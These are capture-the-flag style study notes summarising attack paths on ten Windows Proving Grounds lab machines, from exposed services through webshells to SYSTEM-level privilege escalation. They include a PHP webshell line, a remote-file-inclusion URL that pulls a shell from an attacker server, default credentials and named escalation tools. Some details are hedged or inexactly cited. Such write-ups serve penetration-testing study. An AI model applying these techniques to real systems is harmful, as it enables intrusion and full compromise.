# Example Machine Notes

## Jacko (Windows PG Practice)

1. **Initial Recon:** Open ports included an **H2 database console** on port 8082. The console required no password, allowing direct access.
    
2. **Foothold via H2 RCE:** Using a known technique​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/Jacko.md#:~:text=%E5%88%B0%60http%3A%2F%2F192.168.176.66%3A8082%60%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%85%A5%EF%BC%8C%E5%8F%83%E8%80%83%5Bedb,getInputStream) (Exploit-DB 49384), an SQL query was crafted to inject Java code (via the JDBC `CSVWRITE` function) and load a malicious DLL, resulting in remote code execution. This yielded a reverse shell as user **Tony** on the target.
    
3. **Post-Exploitation:** Retrieved the user flag from Tony’s desktop. Running `whoami /priv` revealed Tony had **SeImpersonatePrivilege**.
    
4. **Privilege Escalation:** Exploited the impersonation privilege with **GodPotato** (a JuicyPotato variant) to spawn a shell as **NT AUTHORITY\SYSTEM**​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/Jacko.md#:~:text=C%3A%5CUsers%5CPublic%5CDocuments%3Ewhoami%20%2Fpriv%20PRIVILEGES%20INFORMATION%20,a%20process%20working%20set%20Disabled) (PrintSpoofer was attempted but failed, so GodPotato was used). Captured the Administrator’s flag from the Administrator desktop.
    

## Craft (Windows PG Practice)

1. **Initial Recon:** Found a web service on port 80 (Apache 2.4.48, PHP 8.0.7) that accepted file uploads (specifically `.odt` files).
    
2. **Foothold via Malicious Macro:** Created an **OpenOffice/LibreOffice `.odt` document** containing a malicious macro (leveraging a known blog technique) that executed a PowerShell one-liner. By uploading the `.odt` and presumably triggering the server to process it, gained a reverse shell as user **thecybergeek**.
    
3. **Pivot – Web Shell:** With filesystem access, discovered an XAMPP web root. Uploaded a simple PHP webshell (`s.php`) via the existing web interface or direct file write, then used it to execute commands and fetch a more stable PowerShell payload. This facilitated a more robust reverse shell.
    
4. **Privilege Escalation:** As thecybergeek, had **SeImpersonatePrivilege**. Used **PrintSpoofer** to impersonate the SYSTEM token via the PrintSpooler service, launching a new reverse shell running as **SYSTEM**. Retrieved the Administrator flag.
    

## Squid (Windows PG Practice)

1. **Initial Recon:** Detected a proxy service (Squid 4.14) on port 3128. Configured our scanner to pivot through the proxy, revealing an internal web service on **port 8080** hosting **phpMyAdmin** (accessible via the proxy). Default credentials (`root:`no password) on phpMyAdmin allowed database access.
    
2. **Foothold via SQL to Web Shell:** Using phpMyAdmin, identified the webroot (from `phpinfo()` output) as `C:\wamp\www`. Leveraged SQL `SELECT ... INTO OUTFILE` to drop a PHP web shell into the webroot. Accessed `shell.php?cmd=...` to execute commands on the server, obtaining a basic shell (running as **Local Service** account via WAMP).
    
3. **Improving Shell:** Uploaded a reverse shell executable and launched it, resulting in a more stable connection as **Local Service**. Collected the user flag. Noticed this account lacked certain privileges by default (no impersonation).
    
4. **Privilege Escalation (2-step):** Employed **FullPowers** (a tool exploiting CVE-2019-1405/1322) to escalate the Local Service user’s privileges (specifically enabling impersonation rights)​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/Squid.md#:~:text=,SeImpersonatePrivilege%20Impersonate%20a%20client%20after). After running FullPowers, `whoami /priv` showed SeImpersonate was now enabled. Then ran **PrintSpoofer** to impersonate SYSTEM, obtaining a shell as **NT AUTHORITY\SYSTEM**. Retrieved the root flag.
    

## Nickel (Windows PG Practice)

1. **Initial Recon:** Discovered two web services on ports 8089 and 33333 (Microsoft HTTPAPI) presenting a “DevTasks” interface with options to list deployments, running processes, etc. The front-end on 8089 attempted to query the backend on 33333 at an internal address. By intercepting and modifying requests, accessed the hidden endpoints on port 33333.
    
2. **Foothold via Exposed Dev Interface:** The **“List Running Processes”** endpoint revealed a command-line that included credentials (`--user ariah -p "<base64_pass>"`). Decoding the base64 string exposed **Ariah’s SSH password**. Logged in via SSH as **ariah**, obtaining user access and the local flag.
    
3. **Lateral Info Gathering:** Found a PDF (`Infrastructure.pdf`) on the box, which was password-protected. Cracked the PDF password (“ariah4168”), revealing notes about internal infrastructure. The notes mentioned a **“Temporary Command endpoint”** on the host.
    
4. **Privilege Escalation via Backdoor:** Using the hint, made an HTTP request to `http://localhost/?<command>` from Ariah’s session. Discovered it executed commands as **SYSTEM** (the output of `?whoami` came back as `nt authority\system`). Exploited this backdoor by requesting it to fetch and run a reverse shell, thereby gaining a shell as **SYSTEM**​[routezero.security](https://routezero.security/2024/11/09/proving-grounds-practice-hepet-walkthrough/#:~:text=Team%2C). Captured the Administrator flag.
    

## Medjed (Windows PG Practice)

1. **Initial Recon:** Found a website on port 8080 requiring a hostname **medjed.offsec** (Beta File Server v0.3). Also discovered ports 8000 (a web config interface), and two high ports serving a web app (a “Quiz App” on XAMPP).
    
2. **Foothold via Config Wizard RCE:** The interface on port 8000 was a Real Time Logic server (likely FuguHub/BarracudaDrive). It was vulnerable to **CVE-2023-24078**, allowing unauthenticated admin access. Using this flaw, created an admin account via the configuration wizard​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/Medjed.md#:~:text=Microsoft%20Windows%20RPC%20%60%60%60%20%E5%85%88%E9%87%9D%E5%B0%8D%60http%3A%2F%2F192.168.172.127%3A8000%60%E5%88%A9%E7%94%A8%5BCVE,Content%2Fcommon.txt%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20Starting). With admin access to the file server, navigated to the XAMPP web directory (`C:\xampp\htdocs`). Uploaded a PHP webshell (`s.php`) into that directory.
    
3. **Web Shell to User Shell:** Accessed the uploaded `s.php` through the Quiz App’s web port (port 45332), successfully executing commands. Used it to drop a Meterpreter/reverse shell payload and obtained an interactive shell as user **jerren** (the account running the web service). Collected the user flag.
    
4. **Privilege Escalation:** Found the service binary for the config interface (`C:\bd\bd.exe`) had **weak file permissions** (modifiable by normal users)​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/Medjed.md#:~:text=%E6%8C%89%E7%85%A7%5Bedb,Authenticated). This is a known issue (CVE-2020-23834)​[nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2020-23834#:~:text=Insecure%20Service%20File%20Permissions%20in,will%20be%20run%20as%20LocalSystem). Renamed the original `bd.exe` and replaced it with a malicious executable (reverse shell). Then rebooted the machine. On startup, the service ran our payload as **SYSTEM**, returning a SYSTEM shell. Obtained the Administrator flag.
    

## Billyboss (Windows PG Practice)

1. **Initial Recon:** Noticed an HTTP service on port 8081 running **Nexus Repository Manager 3.21.0** (which had default credentials) and another on port 80 (BaGet package server).
    
2. **Foothold via Nexus RCE:** Logged into Nexus using default creds (`nexus:nexus`) and exploited a known **RCE in Nexus 3** (CVE-2020-10204) by sending a crafted request through the Nexus script console​[support.sonatype.com](https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-3-Remote-Code-Execution-2020-03-31#:~:text=A%20Remote%20Code%20Execution%20vulnerability,this%20vulnerability%2C%20along%20with%20the). This yielded a reverse shell as a low-privilege user (likely running the Nexus service, e.g., **nathan**). Retrieved the user flag.
    
3. **Post-Exploitation:** Discovered an installed **Jenkins** on the system (found `Jenkins\config.xml` containing credentials for user “billyboss”). Also observed that user nathan had SeImpersonatePrivilege enabled.
    
4. **Privilege Escalation:** Opted for a direct token impersonation approach. Downloaded and executed **GodPotato** to abuse SeImpersonate, launching a new reverse shell as **SYSTEM**​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/Billyboss.md#:~:text=SeTimeZonePrivilege%20Change%20the%20time%20zone,C%3A%5CUsers%5CAdministrator%5CDesktop%3Etype%20proof.txt%20498dd7e6c2e3f51d0591837fee8fcced). (Alternatively, using the Jenkins credentials to run commands via Jenkins UI was possible, but not needed.) Captured the Administrator flag.
    

## Shenzi (Windows PG Practice)

1. **Initial Recon:** Hosted website with a WordPress installation (at `/shenzi`). Found a leaked credentials file (`passwords.txt` in web root) containing the WordPress admin credentials.
    
2. **Foothold via WordPress Admin:** Logged into WordPress as **admin** with the found password. Installed a **webshell through a plugin**: edited the Hello Dolly plugin PHP file to include `system($_GET['cmd'])`. Accessed the shell via `hello.php?cmd=` and confirmed code execution as user **shenzi** (the IIS/AppPool user).
    
3. **User Shell:** Used the webshell to upload a reverse shell payload (PowerShell or EXE) and executed it, obtaining a direct shell session as **shenzi**. Retrieved the user flag.
    
4. **Privilege Escalation:** Discovered Windows Installer policies **AlwaysInstallElevated = 1** in both machine and user registry hives. Generated a malicious MSI package that would add a new admin user or start a reverse shell. Executed the MSI via `msiexec` as the unprivileged user, resulting in code execution as **SYSTEM**. Collected the Administrator flag.
    

## AuthBy (Windows PG Practice)

1. **Initial Recon:** FTP service (zFTPServer 6.0) allowed anonymous access and contained user account files. Retrieved an `.htpasswd` for an Apache web directory on port 242 (Basic Auth credentials for user "offsec").
    
2. **Foothold via Credentials:** Cracked the htpasswd hash to get **offsec:elite** credentials for the protected website. Logged into the web server on port 242 and identified it was running PHP. Using the FTP access (with an admin account), uploaded a PHP webshell into the web directory. Accessed `s.php?cmd=whoami` in the browser to confirm code execution as **apache** (local web user).
    
3. **User Shell:** Employed the webshell to transfer and launch a reverse shell binary, gaining a stable shell as the **Apache** user on the Windows system. Retrieved the user flag.
    
4. **Privilege Escalation:** The target OS was **Windows Server 2008 SP1**, an outdated system. Checked for known exploits and found it vulnerable to **MS11-046** (Windows AFD.sys local privilege escalation). Uploaded a pre-compiled exploit for MS11-046​[github.com](https://github.com/pika5164/Offsec_Proving_Grounds/raw/refs/heads/master/PG_Practice/Windows/AuthBy.md#:~:text=%E2%94%8C%E2%94%80%E2%94%80%28kali%E3%89%BFkali%29,exploits) and executed it, which succeeded in granting a SYSTEM-level shell. Captured the Administrator flag.
    

## Slort (Windows PG Practice)

1. **Initial Recon:** A PHP-based site was accessible. Identified a **Local File Inclusion** vulnerability in `index.php?file=...`. Testing revealed that remote file inclusion was also possible (the server had `allow_url_include` enabled).
    
2. **Foothold via Remote File Include:** Hosted a malicious PHP file on our attacker server and invoked it via the LFI parameter (e.g. `.../index.php?file=http://OUR_SERVER/shell.php`). This caused the target to fetch and execute our PHP, immediately giving a reverse shell as the web process user **rupert**. Collected the user flag.
    
3. **Post-Exploitation:** Found a directory `C:\Backup\` containing `TFTP.exe` and a note indicating a scheduled task: “every 5 minutes run `TFTP.exe -i 192.168.234.57 get backup.txt`”. Crucially, the `TFTP.exe` file had **write permissions for normal users**.
    
4. **Privilege Escalation:** Renamed the original TFTP.exe to keep a backup, then replaced it with a malicious executable (reverse shell payload). After a short wait, the scheduler invoked our trojanized TFTP program. Since the scheduled task runs as SYSTEM, it executed our payload with SYSTEM privileges, returning a SYSTEM shell to us. We then grabbed the Administrator flag.
    

## Hepet (Windows PG Practice)

1. **Initial Recon:** Enumerated services related to email (SMTP, POP3/IMAP on Mercury/32 Mail) and a company webpage (“Time Travel Company”) on ports 443/8000. Guessed or found user credentials (e.g. via finger or site hints) for a mail user (**jonas**). Logged into Jonas’s mailbox via IMAP.
    
2. **Foothold via Malicious Attachment:** In Jonas’s emails, found an internal memo about testing **LibreOffice** for document compatibility – indicating that attachments might be opened on the mail server. Created a malicious **LibreOffice Calc (.ods)** spreadsheet containing a macro that runs a reverse shell payload on open. Emailed this file to an internal user (or to Jonas himself), triggering the mail server to automatically launch LibreOffice for analysis. The macro executed on the server, yielding a reverse shell as user **Ela Arwel** (the system’s mail administrator).
    
3. **Post-Exploitation:** Ela Arwel’s account had high privileges (system administrator). Inspected running services and found **Veyon** (remote monitoring software) running as a service with an unquoted path or installed in a user-writeable directory. The service binary path (`C:\Users\ela arwel\Veyon\VeyonService.exe`) was writable by Ela.
    
4. **Privilege Escalation:** Stopped the Veyon service if possible (or set it to disabled and plan a reboot). Replaced the `VeyonService.exe` with a malicious exe (reverse shell). Restarted the service (or rebooted the machine). The service, running as SYSTEM, launched our payload and gave a SYSTEM shell. Finally, obtained the Administrator (root) flag.